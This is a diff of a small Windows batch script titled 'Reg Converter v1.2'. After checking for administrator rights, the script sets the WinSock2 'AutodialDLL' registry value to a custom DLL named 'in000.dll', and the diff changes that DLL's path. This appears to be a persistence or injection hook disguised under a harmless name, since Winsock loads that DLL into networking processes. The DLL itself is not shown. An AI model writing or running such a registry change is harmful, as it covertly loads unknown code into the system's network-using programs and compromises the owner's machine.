@@ -3,7 +3,7 @@ Title Reg Converter v1.2 & Color 1A
 cd %systemroot%\system32
 call :IsAdmin
 
-Reg.exe add "HKLM\SYSTEM\ControlSet001\Services\WinSock2\Parameters" /v "AutodialDLL" /t REG_SZ /d "C:\Windows\System32\in000.dll" /f
+Reg.exe add "HKLM\SYSTEM\ControlSet001\Services\WinSock2\Parameters" /v "AutodialDLL" /t REG_SZ /d "C:\Windows\in000.dll" /f
 Exit
 
 :IsAdmin
@@ -14,3 +14,4 @@ If Not %ERRORLEVEL% EQU 0 (
 )
 Cls
 goto:eof
+
